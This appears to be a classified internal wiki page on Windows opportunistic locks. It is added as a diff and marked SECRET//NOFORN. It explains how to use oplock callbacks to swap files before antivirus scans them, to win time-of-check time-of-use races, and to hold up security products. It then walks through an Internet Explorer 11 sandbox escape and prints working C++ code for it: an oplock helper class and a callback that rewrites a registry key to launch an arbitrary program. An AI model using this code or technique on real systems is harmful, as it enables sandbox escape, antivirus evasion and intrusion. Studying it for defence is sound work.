@@ -1,0 +1,304 @@
+
+                        Opportunistic Locks
+SECRET//NOFORN
+Definitions:
+Opportunisctic Locking: A file locking mechanism designed to improved performance by controlling caching of network files by the client. Unlike traditional locks, OpLocks are not used to provide mutual exclusion. The main goal of OpLocks is to provide synchronization for caching. Opportunistic Locking is supported by SMB.
+Batch Lock: A batch lock is used to make multiple file opens and close operations in a short timefram emore efficient. A batch lockslows down the close operation so that if a new open file operation occurs, the operation is canceled.
+Exclusive Lock: An exclusive lock occurs when a client opens a file on and SMB server in shared mode. When in an exclusive oplock state, the client can now cache all changes to the file before committing it to the server. When another process/client attempts to open the same file the server sends a break or oplock revocation to the client holding the exclusive lock. At this point the client who obtained the original opportunistic lock flushes all changes to the file. 
+Breaks: A break request is sent from server to client to inform the client that an oplock is no longer valid. This happens when another client wishes to open a file in a way that invalidates the OpLock. The first client is then sent an OpLock break and required to send all of its local changes and acknowledge the break. Upon acknowledgment the can reply to the second client.
+TOCTOU: A time-of-check time-of-use (TOCTOUtime-of-check time-of-use) vulnerability, occurs when an application first checks and validates a resources, does other things, and then uses a resource. An example of a TOCTOUtime-of-check time-of-use bug would be if an application were to validate the certificate of an application, do something else, and then execute the application. TOCTOUtime-of-check time-of-use vulnerabilities rely on a window after validation to switch out the resource.
+ 
+CNE Application:
+For one CNE application we can key in on exclusive opportunistic locking. Specifically we will key in on the fact that the server notifies the owner (oplock initiator) of a break in the oplock. In Windows implementation of opportunistic file locking a callback function be given for oplock break notification. This means, our function will get called when a file is accessed by a third party, although you won't know who is accessing it, you can change the file (or other things) before letting the other application open it. Potentially this could be used to bypass intial PSPPersonal Security Product (Anti-Virus) scanning/sandboxing, by replacing the file with a benign one before the PSPPersonal Security Product (Anti-Virus) gets a handle to the file. This could also be used for notification of point of execution in another application and help you block execution (so you can always win the race). For example, if a TOCTOUtime-of-check time-of-use vulnerability is discovered, and in between check and use a file/directory is read, you may use a tell to know when to switch the resource. 
+ 
+*Note: The second client will not return from the CreateFile call on an oplock'ed file until it is released by the initial client. This could also potentially help DOS a PSP.
+ 
+Example Vulnerability:
+A vulnerability first discovered by User #75254 (Google's Zero Day Project), utilized a TOCTOUtime-of-check time-of-use vulnerability with a COM object to escape the Internet Explorer sandbox. In the sandboxed IEInternet Explorer process, you are allowed to create a COM broker to the medium integrity process. Once you have the broker, you are allowed to obtain some of the classes implemented by ieframe. This includes an implementation of IShDocVwBroker. One of the functions IShDocVwBroker, titled EditWith lets you pass a file path and a class registry handle to call ShellExecute on. Since you are only allowed to execute certain Microsoft processes, the target object is validated. However, between validation and execution the implementation takes time to verify that the file you pass exists. Thus, if we create an opportunistic lock on a file or folder that the medium integrity process tries to access in between validation and execution, we can swap out the execution values to one of our own. Let's take a look at this in action:
+ 
+
+ 
+We'll start with skipping to the point where we have execution inside the Internet Explorer sandboxed process, have the IEBrokerComObject, and a IShDocVwBroker object. When we call the EditWith function this is the action we see in the medium integrity IEInternet Explorer broker process actions (IE11 Windows 8.1 Enhanced Protection Mode).
+ 
+Here the process we sent to execute is being validated (Notepad is one of a handful of accepted processes):
+
+ 
+Next, we see the process validating the existence of the file we pass to EditWith:
+
+ 
+Finally, the medium integrity process calls CreateProcess on the application:
+
+ 
+Knowing that we can get a callback when the medium integerity IEInternet Explorer process tries to read the dummy directory, we can set an oplock and change the application from notepad to calc (an untrusted process).
+
+Before the CreateFile can return for the medium integrity process, we have switched the key out with our version.
+ 
+Now the medium integrity process kicks off our arbitrary application. 
+
+
+ 
+Taking a look at the oplock code, we create the oplock, call the EditWith function and then wait for the oplock callback to get called. 
+
+FileOpLock* oplock = FileOpLock::CreateLock(tempPath.GetBSTR(), L"", HandleOplock, hCommand); //Create an OpLock on folder containing the file we're 'Editing', no share mode, HandleOplock callback function, handle to the key to pass to HandleOplock as an argument.
+if (oplock)
+{				
+	//Call our EditWith Function
+	DebugPrintf("EditWith: %08X\n", shdocvw->EditWith(nullptr, GetCurrentProcessId(), 
+		(DWORD64)hKey, SEE_MASK_CLASSKEY, bstr_t(L"open"), filePath, bstr_t(L"test")));
+	
+	//This waits for the callback function to finish before cleaning up
+	oplock->WaitForLock(INFINITE);
+	delete oplock;
+}
+
+
+ HandleOplock Code:
+
+void HandleOplock(void* arg)
+{
+	HKEY hKey = (HKEY)arg;
+
+	bstr_t cmdLine = L"\"" + GetWindowsSystemDirectory() + L"\\calc.exe";
+	cmdLine += L"\" \"%1\"";
+
+	SetRegValue(hKey, nullptr, cmdLine);
+}
+
+  
+CreateLock Code:
+
+class FileOpLock
+{
+public:
+	typedef void(*UserCallback)(void* arg);
+	static FileOpLock* CreateLock(const std::wstring& name, const std::wstring& share_mode, FileOpLock::UserCallback cb, void* arg);
+	void WaitForLock(UINT Timeout); 
+	~FileOpLock();
+private:
+ 
+	HANDLE g_hFile; //Handle To the file oplock is created on
+	OVERLAPPED g_o; //Overlapped Structure
+	REQUEST_OPLOCK_INPUT_BUFFER g_inputBuffer; //Input buffer needed for DeviceIoControl
+	REQUEST_OPLOCK_OUTPUT_BUFFER g_outputBuffer; //Output buffer needed for DeviceIoControl
+	HANDLE g_hLockCompleted; //Handle To Lock Completed Event
+	PTP_WAIT g_wait;
+	UserCallback _cb;
+	void* _arg;
+ 
+	FileOpLock(UserCallback cb, void* arg);
+ 
+	static void CALLBACK WaitCallback(PTP_CALLBACK_INSTANCE Instance,
+		PVOID Parameter, PTP_WAIT Wait,
+		TP_WAIT_RESULT WaitResult);
+ 
+	void DoWaitCallback();
+ 
+	bool BeginLock(const std::wstring& name, DWORD dwShareMode);
+ 
+};
+ 
+ FileOpLock::FileOpLock(UserCallback cb, void* arg):
+	g_inputBuffer({ 0 }), g_outputBuffer({ 0 }), g_o({ 0 }), g_hFile(INVALID_HANDLE_VALUE), g_hLockCompleted(nullptr), g_wait(nullptr), _cb(cb), _arg(arg)
+{
+	//Setup Input Buffer and Output Buffer Args For DeviceIoControl
+	g_inputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
+	g_inputBuffer.StructureLength = sizeof(g_inputBuffer);
+	g_inputBuffer.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE; //If a file/folder is opened with GENERIC_READ - fire callback
+	g_inputBuffer.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;	
+	g_outputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
+	g_outputBuffer.StructureLength = sizeof(g_outputBuffer);
+}
+ 
+ 
+FileOpLock::~FileOpLock()
+{
+	if (g_wait)
+	{
+		SetThreadpoolWait(g_wait, nullptr, nullptr);
+		CloseThreadpoolWait(g_wait);
+		g_wait = nullptr;
+	}
+ 
+	if (g_o.hEvent)
+	{
+		CloseHandle(g_o.hEvent);
+		g_o.hEvent = nullptr;
+	}
+ 
+	if (g_hFile != INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(g_hFile);
+		g_hFile = INVALID_HANDLE_VALUE;
+	}
+}
+ 
+bool FileOpLock::BeginLock(const std::wstring& filename, DWORD dwShareMode)
+{
+	//Set up overlapped event and callback completion event
+	g_hLockCompleted = CreateEvent(nullptr, TRUE, FALSE, nullptr);
+	g_o.hEvent = CreateEvent(nullptr, FALSE, FALSE, nullptr);
+ 
+	DWORD flags = FILE_FLAG_OVERLAPPED;
+ 
+	//Need special attributes for directory oplocks (directory oplocks only work on Windows 8+)
+	if (GetFileAttributesW(filename.c_str()) & FILE_ATTRIBUTE_DIRECTORY)
+	{
+		flags |= FILE_FLAG_BACKUP_SEMANTICS;
+	}
+ 
+	//Open File
+	g_hFile = CreateFileW(filename.c_str(), GENERIC_READ,
+		dwShareMode, nullptr, OPEN_EXISTING,
+		flags, nullptr);
+	if (g_hFile == INVALID_HANDLE_VALUE) {
+		DebugPrintf("Error opening file: %d\n", GetLastError());
+		return false;
+	}
+ 
+	//Use Threadpool Wait
+	g_wait = CreateThreadpoolWait(WaitCallback, this, nullptr);
+	if (g_wait == nullptr)
+	{
+		DebugPrintf("Error creating threadpool %d\n", GetLastError());
+		return false;
+	}
+ 
+	SetThreadpoolWait(g_wait, g_o.hEvent, nullptr);
+ 
+	//Call DeviceIoControl 
+	DeviceIoControl(g_hFile, FSCTL_REQUEST_OPLOCK,
+		&g_inputBuffer, sizeof(g_inputBuffer),
+		&g_outputBuffer, sizeof(g_outputBuffer),
+		nullptr, &g_o);
+	DWORD err = GetLastError();
+	if (err != ERROR_IO_PENDING) {
+		DebugPrintf("Oplock Failed %d\n", err);
+		return false;
+	}
+	
+	return true;
+}
+ 
+FileOpLock* FileOpLock::CreateLock(const std::wstring& name, const std::wstring& share_mode, FileOpLock::UserCallback cb, void* arg)
+{
+	FileOpLock* ret = new FileOpLock(cb, arg);
+	DWORD dwShareMode = 0;
+ 
+	if (share_mode.find('r') != std::wstring::npos)
+	{
+		dwShareMode |= FILE_SHARE_READ;
+	}
+ 
+	if (share_mode.find('w') != std::wstring::npos)
+	{
+		dwShareMode |= FILE_SHARE_WRITE;
+	}
+ 
+	if (share_mode.find('d') != std::wstring::npos)
+	{
+		dwShareMode |= FILE_SHARE_DELETE;
+	}
+ 
+	if (ret->BeginLock(name, dwShareMode))
+	{
+		return ret;
+	}
+	else
+	{
+		delete ret;
+		return nullptr;
+	}
+}
+ 
+void FileOpLock::WaitForLock(UINT Timeout)
+{	
+	WaitForSingleObject(g_hLockCompleted, Timeout);
+}
+ 
+void FileOpLock::WaitCallback(PTP_CALLBACK_INSTANCE Instance,
+	PVOID Parameter, PTP_WAIT Wait,
+	TP_WAIT_RESULT WaitResult)
+{
+	UNREFERENCED_PARAMETER(Instance);
+	UNREFERENCED_PARAMETER(Wait);
+	UNREFERENCED_PARAMETER(WaitResult);
+ 
+	FileOpLock* lock = reinterpret_cast<FileOpLock*>(Parameter);
+ 
+	lock->DoWaitCallback();	
+}
+ 
+void FileOpLock::DoWaitCallback()
+{	
+	DWORD dwBytes;
+	if (!GetOverlappedResult(g_hFile, &g_o, &dwBytes, TRUE)) {
+		DebugPrintf("Oplock Failed\n");		
+	}
+	
+	if (_cb)
+	{
+		_cb(_arg);
+	}
+	
+	DebugPrintf("Closing Handle\n");
+	CloseHandle(g_hFile);
+	g_hFile = INVALID_HANDLE_VALUE;
+	SetEvent(g_hLockCompleted);
+}
+
+ I'll try to extend this with some other notes I have later, but this is it for now.
+ 
+SECRET//NOFORN
+
+Attachments:
+
+
+image2015-12-10 10:21:2.png
+
+
+image2015-12-10 10:11:20.png
+
+
+image2015-12-10 10:2:34.png
+
+
+image2015-12-10 10:1:14.png
+
+
+image2015-12-10 9:59:56.png
+
+
+image2015-12-10 9:59:30.png
+
+
+image2015-12-10 9:58:59.png
+
+
+image2015-12-10 9:58:1.png
+
+
+image2015-12-10 9:53:40.png
+
+
+image2015-12-10 9:35:41.png
+
+
+image2015-12-10 9:35:3.png
+
+
+
+Previous versions:
+| 1 SECRET
+| 2 SECRET
+| 3 SECRET
+| 4 SECRET
+| 5 SECRET
+| 6 SECRET
+| 7 SECRET
+| 8 SECRET
+| 9 SECRET
+| 10 SECRET
+| 11 SECRET
+| 12 SECRET
+|
+                    
